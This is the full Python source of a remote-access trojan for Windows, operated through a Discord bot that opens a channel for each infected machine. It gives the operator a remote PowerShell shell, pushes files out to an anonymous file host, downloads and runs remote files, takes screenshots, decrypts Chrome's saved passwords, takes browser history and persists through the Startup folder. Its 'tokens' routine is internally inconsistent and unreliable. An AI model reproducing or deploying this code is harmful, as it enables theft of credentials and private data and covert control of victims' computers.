import os
import sys
import discord
import subprocess
import requests
import re
import json
import win32crypt
import base64
import shutil
import sqlite3
import winreg
from Crypto.Cipher import AES
from PIL import ImageGrab
from datetime import datetime, timedelta

APPDATA = os.getenv("APPDATA")
LOCALAPPDATA = os.getenv("LOCALAPPDATA")
TEMP = os.getenv("TEMP")

guild_id = "SERVER_ID"  # server
token = "BOT_TOKEN"  # bot token

def get_processor():
    stdout = subprocess.Popen(
        ["powershell.exe", "Get-WmiObject -Class Win32_Processor -ComputerName . | Select-Object -Property Name"],
        stdout=subprocess.PIPE, shell=True
    ).stdout.read().decode()
    return stdout.split("\n")[3]

def get_gpu():
    stdout = subprocess.Popen(
        ["powershell.exe", "Get-WmiObject -Class Win32_VideoController -ComputerName . | Select-Object -Property Name"],
        stdout=subprocess.PIPE, shell=True
    ).stdout.read().decode()
    return stdout.split("\n")[3]

def get_os():
    stdout = subprocess.Popen(
        ["powershell.exe", "Get-WmiObject -Class Win32_OperatingSystem -ComputerName . | Select-Object -Property Caption"],
        stdout=subprocess.PIPE, shell=True
    ).stdout.read().decode()
    return stdout.split("\n")[3]

intents = discord.Intents.all()
bot = discord.Client(intents=intents)
session_id = os.urandom(8).hex()
commands = "\n".join([
    "help - Help command",
    "ping - Ping command",
    "cwd - Get current working directory",
    "cd - Change directory",
    "ls - List directory",
    "download <file> - Download file",
    "upload <link> - Upload file",
    "shell - Execute shell command",
    "run <file> - Run an file",
    "exit - Exit the session",
    "screenshot - Take a screenshot",
    "tokens - Get all discord tokens",
    "passwords - Extract all browser passwords",
    "history - Extract all browser history",
    "startup <name> - Add to startup",
])

@bot.event
async def on_ready():
    guild = bot.get_guild(int(guild_id))
    channel = await guild.create_text_channel(session_id)
    ip_address = requests.get("https://api.ipify.org").text
    embed = discord.Embed(title="New session created", description="", color=0xfafafa)
    embed.add_field(name="Session ID", value=f"```{session_id}```", inline=True)
    embed.add_field(name="Username", value=f"```{os.getlogin()}```", inline=True)
    embed.add_field(name="🛰️  Network Information", value=f"```IP: {ip_address}```", inline=False)
    sys_info = "\n".join([
        f"OS: {get_os()}",
        f"CPU: {get_processor()}",
        f"GPU: {get_gpu()}"
    ])
    embed.add_field(name="🖥️  System Information", value=f"```{sys_info}```", inline=False)
    embed.add_field(name="🤖  Commands", value=f"```{commands}```", inline=False)
    await channel.send(embed=embed)

@bot.event
async def on_message(message):
    if message.author == bot.user:
        return

    if message.channel.name != session_id:
        return

    if message.content == "help":
        embed = discord.Embed(title="Help", description=f"```{commands}```", color=0xfafafa)
        await message.reply(embed=embed)

    if message.content == "ping":
        embed = discord.Embed(title="Ping", description=f"```{round(bot.latency * 1000)}ms```", color=0xfafafa)
        await message.reply(embed=embed)

    if message.content.startswith("cd"):
        directory = message.content[3:]
        try:
            os.chdir(directory)
            embed = discord.Embed(title="Changed Directory", description=f"```{os.getcwd()}```", color=0xfafafa)
        except:
            embed = discord.Embed(title="Error", description=f"```Directory not found```", color=0xfafafa)
        await message.reply(embed=embed)

    if message.content == "ls":
        files = "\n".join(os.listdir())
        if files == "":
            files = "No files found"
        if len(files) > 4093:
            open(f"{TEMP}\\list.txt", "w").write(files)
            embed = discord.Embed(title=f"Files > {os.getcwd()}", description="```See attachment```", color=0xfafafa)
            file = discord.File(f"{TEMP}\\list.txt")
            return await message.reply(embed=embed, file=file)
        embed = discord.Embed(title=f"Files > {os.getcwd()}", description=f"```{files}```", color=0xfafafa)
        await message.reply(embed=embed)

    if message.content.startswith("download"):
        file = message.content[9:]
        if os.path.exists(file):
            try:
                link = requests.post("https://api.anonfiles.com/upload", files={"file": open(file, "rb")}).json()["data"]["file"]["url"]["full"]
                embed = discord.Embed(title="Download", description=f"```{link}```", color=0xfafafa)
            except Exception as e:
                embed = discord.Embed(title="Error", description=f"```Failed to upload: {str(e)}```", color=0xfafafa)
        else:
            embed = discord.Embed(title="Error", description=f"```File not found: {file}```", color=0xfafafa)
        await message.reply(embed=embed)

    if message.content.startswith("upload"):
        link = message.content[7:]
        try:
            file_name = os.path.basename(link.split("?")[0])
            file = requests.get(link).content
            with open(file_name, "wb") as f:
                f.write(file)
            embed = discord.Embed(title="Upload", description=f"```{file_name}```", color=0xfafafa)
        except Exception as e:
            embed = discord.Embed(title="Error", description=f"```Failed to upload: {str(e)}```", color=0xfafafa)
        await message.reply(embed=embed)

    if message.content.startswith("shell"):
        command = message.content[6:]
        output = subprocess.Popen(
            ["powershell.exe", command], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True
        ).communicate()[0].decode("utf-8")
        if output == "":
            output = "No output"
        if len(output) > 4093:
            open(f"{TEMP}\\output.txt", "w").write(output)
            embed = discord.Embed(title=f"Shell > {os.getcwd()}", description="```See attachment```", color=0xfafafa)
            file = discord.File(f"{TEMP}\\output.txt")
            return await message.reply(embed=embed, file=file)
        embed = discord.Embed(title=f"Shell > {os.getcwd()}", description=f"```{output}```", color=0xfafafa)
        await message.reply(embed=embed)

    if message.content.startswith("run"):
        file = message.content[4:]
        subprocess.Popen(file, shell=True)
        embed = discord.Embed(title="Started", description=f"```{file}```", color=0xfafafa)
        await message.reply(embed=embed)

    if message.content == "exit":
        await message.channel.delete()
        await bot.close()

    if message.content == "screenshot":
        screenshot = ImageGrab.grab(all_screens=True)
        path = os.path.join(TEMP, "screenshot.png")
        screenshot.save(path)
        file = discord.File(path)
        embed = discord.Embed(title="Screenshot", color=0xfafafa)
        embed.set_image(url="attachment://screenshot.png")
        await message.reply(embed=embed, file=file)

    if message.content == "cwd":
        embed = discord.Embed(title="Current Directory", description=f"```{os.getcwd()}```", color=0xfafafa)
        await message.reply(embed=embed)

    if message.content == "tokens":
        tokens = []
        path = f"{APPDATA}\\discord"
        if not os.path.exists(path):
            embed = discord.Embed(title="Error", description="```Discord not installed```", color=0xfafafa)
            return await message.reply(embed=embed)
        local_state_path = os.path.join(path, "Local State")
        if not os.path.exists(local_state_path):
            embed = discord.Embed(title="Error", description="```Local State file not found```", color=0xfafafa)
            return await message.reply(embed=embed)
        local_state = json.loads(open(local_state_path, "r").read())["os_crypt"]["encrypted_key"]
        local_state = base64.b64decode(local_state)[5:]
        master_key = win32crypt.CryptUnprotectData(local_state, None, None, None, 0)[1]
        login_db = f"{LOCALAPPDATA}\\Google\\Chrome\\User Data\\Default\\Network\\Cookies"
        if not os.path.exists(login_db):
            embed = discord.Embed(title="Error", description="```Cookies database not found```", color=0xfafafa)
            return await message.reply(embed=embed)
        shutil.copy2(login_db, f"{TEMP}\\Cookies")
        db = sqlite3.connect(f"{TEMP}\\Cookies")
        cursor = db.cursor()
        cursor.execute("SELECT * FROM logins")
        for row in cursor.fetchall():
            password = row[5]
            iv = row[3][3:15]
            password = password[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            tokens.append(f"URL: {row[1]}\nUser: {row[3]}\nPassword: {cipher.decrypt(password)[:-16].decode()}")
        if len(tokens) > 4093:
            open(f"{TEMP}\\tokens.txt", "w").write("\n\n".join(tokens))
            embed = discord.Embed(title="Discord tokens", description="```See attachment```", color=0xfafafa)
            file = discord.File(f"{TEMP}\\tokens.txt")
            return await message.reply(embed=embed, file=file)
        embed = discord.Embed(title="Discord tokens", description=f"```{tokens}```", color=0xfafafa)
        await message.reply(embed=embed)

    if message.content == "passwords":
        try:
            passwords = []
            chrome_path_local_state = os.path.normpath(r"%s\Google\Chrome\User Data\Local State" % LOCALAPPDATA)
            if not os.path.exists(chrome_path_local_state):
                embed = discord.Embed(title="Error", description="```Local State file not found```", color=0xfafafa)
                return await message.reply(embed=embed)
            with open(chrome_path_local_state, "r", encoding="utf-8") as f:
                local_state = json.loads(f.read())
            master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
            master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
            db_path = os.path.join(LOCALAPPDATA, "Google", "Chrome", "User Data", "Default", "Login Data")
            shutil.copy2(db_path, f"{TEMP}\\Login Data")
            conn = sqlite3.connect(f"{TEMP}\\Login Data")
            cursor = conn.cursor()
            cursor.execute("SELECT action_url, username_value, password_value FROM logins")
            for r in cursor.fetchall():
                iv = r[2][3:15]
                password = r[2][15:-16]
                cipher = AES.new(master_key, AES.MODE_GCM, iv)
                decrypted_pass = cipher.decrypt(password).decode()
                passwords.append(f"URL: {r[0]}\nUser: {r[1]}\nPassword: {decrypted_pass}")
            cursor.close()
            conn.close()
            if len(passwords) > 4093:
                open(f"{TEMP}\\passwords.txt", "w").write("\n\n".join(passwords))
                embed = discord.Embed(title="Passwords", description="```See attachment```", color=0xfafafa)
                file = discord.File(f"{TEMP}\\passwords.txt")
                return await message.reply(embed=embed, file=file)
            embed = discord.Embed(title="Passwords", description=f"```{passwords}```", color=0xfafafa)
            await message.reply(embed=embed)
        except Exception as e:
            embed = discord.Embed(title="Error", description=f"```Failed to extract passwords: {str(e)}```", color=0xfafafa)
            await message.reply(embed=embed)

    if message.content == "history":
        try:
            history = []
            db_path = os.path.join(LOCALAPPDATA, "Google", "Chrome", "User Data", "Default", "History")
            shutil.copy2(db_path, f"{TEMP}\\History")
            conn = sqlite3.connect(f"{TEMP}\\History")
            cursor = conn.cursor()
            cursor.execute("SELECT url, title, last_visit_time FROM urls")
            for r in cursor.fetchall():
                history.append(f"URL: {r[0]}\nTitle: {r[1]}\nLast Visit: {datetime(1601, 1, 1) + timedelta(microseconds=r[2])}")
            cursor.close()
            conn.close()
            if len(history) > 4093:
                open(f"{TEMP}\\history.txt", "w").write("\n\n".join(history))
                embed = discord.Embed(title="Browser History", description="```See attachment```", color=0xfafafa)
                file = discord.File(f"{TEMP}\\history.txt")
                return await message.reply(embed=embed, file=file)
            embed = discord.Embed(title="Browser History", description=f"```{history}```", color=0xfafafa)
            await message.reply(embed=embed)
        except Exception as e:
            embed = discord.Embed(title="Error", description=f"```Failed to extract browser history: {str(e)}```", color=0xfafafa)
            await message.reply(embed=embed)

    if message.content.startswith("startup"):
        try:
            name = message.content[8:]
            path = sys.argv[0]
            bat_path = os.path.join(LOCALAPPDATA, "Microsoft", "Windows", "Start Menu", "Programs", "Startup", f"{name}.bat")
            with open(bat_path, "w") as f:
                f.write(f'start "" "{path}"')
            embed = discord.Embed(title="Startup", description=f"```Added to startup: {bat_path}```", color=0xfafafa)
            await message.reply(embed=embed)
        except Exception as e:
            embed = discord.Embed(title="Error", description=f"```Failed to add to startup: {str(e)}```", color=0xfafafa)
            await message.reply(embed=embed)

bot.run(token)
